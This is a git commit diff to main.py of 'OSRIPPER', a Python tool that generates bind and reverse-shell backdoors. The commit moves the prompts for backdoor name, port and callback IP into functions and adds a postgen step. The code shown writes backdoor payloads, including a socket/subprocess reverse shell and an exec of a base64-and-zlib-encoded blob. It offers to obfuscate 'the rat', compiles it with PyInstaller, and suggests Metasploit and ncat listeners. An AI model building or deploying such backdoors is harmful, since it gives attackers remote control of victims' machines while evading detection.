d1212661894f13a50814d042c6ab66de6ea05069
hades921 <99681487+3subs@users.noreply.github.com>
2022-02-28 11:44:01 +0000

    improved readme.md and code

--- main.py
+++ main.py
@@ -46,13 +46,15 @@ logo = """
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-
+                                                                           OSRIPPER v0.1.1
 """
 
 clear = lambda: os.system('cls')
 clear()
 print(logo)
 def gen_bind():
+    name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
+    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
     with open(name, 'a+') as ina:
         ina.write('port = '+str(port))
         a = '''
@@ -72,11 +74,14 @@ exec(zlib.decompress(base64.b64decode(d)),{'s':s})
         print('(*) Generated Backdoor and saved as '+name)
         print('After deployment interact with this Backdoor through this module in metasploit python/meterpreter/bind_tcp')
 def gen_rev():
-        host = input('Please enter the ip you wish the backdoor to connect back to: ')
-        with open(name, 'a+') as ina:
-            ina.write('port = '+str(port)+'\n')
-            ina.write('hototo = "'+str(host)+'"')
-            b = '''
+
+    name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
+    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
+    host = input('Please enter the ip you wish the backdoor to connect back to: ')
+    with open(name, 'a+') as ina:
+        ina.write('port = '+str(port)+'\n')
+        ina.write('hototo = "'+str(host)+'"')
+        b = '''
     import socket as s
     import subprocess as r
     from time import sleep
@@ -97,12 +102,29 @@ def gen_rev():
             main()
     main()        
                     '''
-            ina.write(b)
-            ina.close
-            print('(*) Generated Backdoor and saved as '+name)
-            print('To open a listener you can run this command "ncat -lvnp '+port+'"')
-name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
-port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
+        ina.write(b)
+        ina.close
+        print('(*) Generated Backdoor and saved as '+name)
+        print('To open a listener you can run this command "ncat -lvnp '+port+'"')
+def postgen():
+    opt_obf = input('Do you want to obfuscate the rat (recommended) (y/n): ')
+    if opt_obf == 'y':
+        
+        import obfuscator
+        obfuscator.MainMenu(name)
+        encrypted = True
+        compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
+        if compiling == 'y':
+            if encrypted == True:
+                compcomd = 'pyinstaller -F --key sdkvksdbx=hk+b.axc132^ '+name+'_enc.py'
+                os.system(compcomd)
+                print('Saved under "dist" folder')
+            else:
+                compcomd = 'pyinstaller -F --key sdkvksdbx=hk+b.axc132^ '+name
+                os.system(compcomd)
+                os.system(clear)
+                print(logo)
+                print('Backdoor saved under "dist" folder')
 print("""BackDoor Module
         
         1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
@@ -112,23 +134,7 @@ encrypted = False
 nscan = input("Please select a module: ")
 if nscan == "1":
     gen_bind()
+    postgen()
 if nscan == "2":
     gen_rev()
-
-opt_obf = input('Do you want to obfuscate the rat (recommended) (y/n): ')
-if opt_obf == 'y':
-    import obfuscator
-    obfuscator.MainMenu(name)
-    encrypted = True
-    compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
-    if compiling == 'y':
-        if encrypted == True:
-            compcomd = 'pyinstaller -F --key sdkvksdbx=hk+b.axc132^ '+name+'_enc.py'
-            os.system(compcomd)
-            print('Saved under "dist" folder')
-        else:
-            compcomd = 'pyinstaller -F --key sdkvksdbx=hk+b.axc132^ '+name
-            os.system(compcomd)
-            os.system(clear)
-            print(logo)
-            print('Backdoor saved under "dist" folder')
+    postgen()
